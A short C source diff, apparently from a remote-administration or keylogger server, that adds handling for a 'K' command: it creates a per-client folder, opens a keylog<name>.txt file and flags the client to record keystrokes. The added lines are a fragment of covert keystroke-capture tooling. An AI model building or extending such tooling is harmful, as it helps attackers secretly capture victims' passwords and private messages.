@@ -10,6 +10,8 @@
 #include <string.h>
 #include <sys/select.h>
 #include <sys/epoll.h>
+#include <sys/stat.h>
+#include <fcntl.h>
 #include <pthread.h>
 
 extern clientHandler_t clientHndler;
@@ -82,7 +84,7 @@ void *userManagement(int clientNr)
         fd_set read_fds;
         FD_ZERO(&read_fds);
         FD_SET(STDIN_FILENO, &read_fds);
-
+        char filename[BUFFER_SIZE];
         struct timeval timeout = {0, 100000}; // Timeout de 100ms
         int ready = select(STDIN_FILENO + 1, &read_fds, NULL, NULL, &timeout);
 
@@ -103,6 +105,12 @@ void *userManagement(int clientNr)
                 strcpy(BUF, "");
                 encapsulateMessage(&scr_msg, BUF, 'K');
                 sendMessage(clientSock, &scr_msg);
+                snprintf(filename, sizeof(filename), "%s/keylog%s.txt", clientHndler.clientsAttr[clientSock].name, clientHndler.clientsAttr[clientSock].name);
+
+                mkdir(clientHndler.clientsAttr[clientSock].name, 0755);
+
+                clientHndler.clientsAttr[clientSock].keylogger_fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);
+                clientHndler.clientsAttr[clientSock].recordKeys = 1;
                 break;
             case 'c':
             {
